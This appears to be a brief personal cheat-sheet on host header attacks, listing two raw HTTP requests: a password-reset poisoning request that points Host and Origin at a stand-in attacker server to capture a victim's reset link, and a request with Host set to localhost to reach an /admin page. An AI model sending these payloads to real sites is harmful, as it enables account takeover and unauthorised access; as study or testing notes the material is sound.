# Host Header Attacks

```bash
Ideas > 
1: Changes 'Origin' & 'Host' to my host ( then checks access log )
				----------------------------------
				POST /forgot-password HTTP/2
				Host: evil-server.net
				Origin: https://evil-server.net/forgot-password
				
				username=victim
				----------------------------------

2: Change host to localhost 
				----------------------------------
				GET /admin HTTP/2
				Host: localhost
				----------------------------------

```